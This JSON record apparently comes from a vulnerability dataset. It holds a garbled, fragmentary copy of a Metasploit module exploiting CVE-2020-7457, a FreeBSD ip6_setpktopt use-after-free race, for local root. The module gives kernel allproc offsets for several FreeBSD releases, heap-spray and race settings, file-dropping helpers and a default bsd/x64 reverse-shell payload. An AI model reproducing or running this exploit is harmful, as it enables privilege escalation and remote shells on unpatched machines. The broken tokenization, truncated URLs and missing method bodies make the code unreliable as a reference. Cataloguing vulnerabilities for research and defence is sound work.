{
    "text": "vul_name : FreeBSD ip6_setpktopt Use-After-Free Privilege Escalation ， vul_cve : CVE-2020-7457 ， vul_poc :  ，  # This module requires Metasploit :  ，  # Current source :  ， class MetasploitModule < Msf : Exploit : Local ， Rank = GreatRanking ， prepend Msf : Exploit : Remote : AutoCheck ， include Msf : Post : File ， include Msf : Post : Unix ， include Msf : Exploit : EXE ， include Msf : Exploit : FileDropper ， super (  ， update_info (  ， info ,  ， 'Name' => 'FreeBSD ip6_setpktopt Use-After-Free Privilege Escalation' ,  ， 'Description' => %q{ ， This module exploits a race and use-after-free vulnerability in the ， FreeBSD kernel IPv6 socket handling. A missing synchronization lock ， in the `IPV6_2292PKTOPTIONS` option handling in `setsockopt` permits ， racing `ip6_setpktopt` access to a freed `ip6_pktopts` struct. ， This exploit overwrites the `ip6po_pktinfo` pointer of a `ip6_pktopts` ， struct in freed memory to achieve arbitrary kernel read/write. ， This module has been tested successfully on :  ， FreeBSD 9.0-RELEASE # 0 ( amd64 )  ;  ， FreeBSD 9.1-RELEASE # 0 r243825 ( amd64 )  ;  ， FreeBSD 9.2-RELEASE # 0 r255898 ( amd64 )  ;  ， FreeBSD 9.3-RELEASE # 0 r268512 ( amd64 )  ;  ， FreeBSD 12.0-RELEASE r341666 ( amd64 )  ; and ， FreeBSD 12.1-RELEASE r354233 ( amd64 ) . ， } ,  ， 'License' => MSF_LICENSE ,  ， 'Author' => ，  [  ， 'Andy Nguyen' ,  #  @ theflow0 - discovery and exploit ， 'bcoles' # metasploit ，  ]  ,  ， 'DisclosureDate' => '2020-07-07' ,  ， 'Platform' => [ 'bsd' ]  ,  # FreeBSD ， 'Arch' => [ ARCH_X64 ]  ,  ， 'SessionTypes' => [ 'shell' ]  ,  ， ' ，  [  ，  [ 'CVE' , '2020-7457' ]  ,  ，  [ 'EDB' , '48644' ]  ,  ，  [ 'PACKETSTORM' , '158341' ]  ,  ，  [ 'URL' , ' ，  [ 'URL' , ' ，  [ 'URL' , ' ，  [ 'URL' , ' ，  [ 'URL' , ' ，  ]  ,  ， 'Targets' => ，  [  ，  [  ， 'Automatic' ,  ， {} ，  ]  ,  ，  [  ， 'FreeBSD 9.0-RELEASE # 0' ,  ， { ， allproc : '0xf01e40' ， } ，  ]  ,  ，  [  ， 'FreeBSD 9.1-RELEASE # 0 r243825' ,  ， { ， allproc : '0x1028880' ， } ，  ]  ,  ，  [  ， 'FreeBSD 9.2-RELEASE # 0 r255898' ,  ， { ， allproc : '0x11c9ba0' ， } ，  ]  ,  ，  [  ， 'FreeBSD 9.3-RELEASE # 0 r268512' ,  ， { ， allproc : '0x1295800' ， } ，  ]  ,  ，  [  ， 'FreeBSD 12.0-RELEASE r341666' ,  ， { ， allproc : '0x1df3c38' ， } ，  ]  ,  ，  [  ， 'FreeBSD 12.1-RELEASE r354233' ,  ， { ， allproc : '0x1df7648' ， } ，  ]  ,  ，  ]  ,  ， 'DefaultOptions' => ， { ， 'PAYLOAD' => 'bsd/x64/shell_reverse_tcp' ,  ， 'PrependFork' => true ,  ， 'WfsDelay' => 10 ， } ,  ， 'Notes' => ， { ， 'Stability' => [ CRASH_OS_RESTARTS ]  ,  ， 'SideEffects' => [ ARTIFACTS_ON_DISK , IOC_IN_LOGS ]  ， } ,  ， 'DefaultTarget' => 0 ， register_advanced_options (  [  ， OptInt.new ( 'NUM_SPRAY' ,  [ true , 'Spray iterations' , 256 ]  )  ,  ， OptInt.new ( 'NUM_SPRAY_RACE' ,  [ true , 'Race iterations' , 32 ]  )  ,  ， OptString.new ( 'WritableDir' ,  [ true , 'A directory where we can write files' , '/tmp' ]  )  ，  ]  )  ， end ， def base_dir ， datastore [ 'WritableDir' ] .to_s ， end ， print_status ( \"Writing ' # {path}' (  # {data.size} bytes ) .\" )  ， rm_f ( path )  ， write_file ( path , data )  ， register_file_for_cleanup ( path )  ， end ， c_code.gsub ( %r{/\\ * . * ?\\ * /}m , ' ) .gsub ( %r{^\\s * /. *  $ } , ' )  ， end ， targets.each do | t |  ， end ， nil ， end ， def check ， kernel_version = cmd_exec ( 'uname -v' ) .to_s ， unless kernel_version.include? ( 'FreeBSD' ) ",
    "time": "2020.08.01"
}